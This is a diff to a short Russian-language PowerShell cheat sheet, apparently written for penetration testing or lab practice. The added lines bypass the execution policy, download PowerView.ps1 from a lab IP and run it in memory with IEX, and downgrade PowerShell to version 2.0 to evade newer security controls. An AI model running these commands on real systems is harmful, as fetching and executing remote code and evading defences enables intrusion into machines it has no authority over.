@@ -1,7 +1,19 @@
 # Обход блокировка скрипта
 
 Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass 
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')
+
+# Понизить версию Powershell
+
+PowerShell.exe –version 2.0
+
+Get-Host
+
+exit
+
 
 # POWER
 
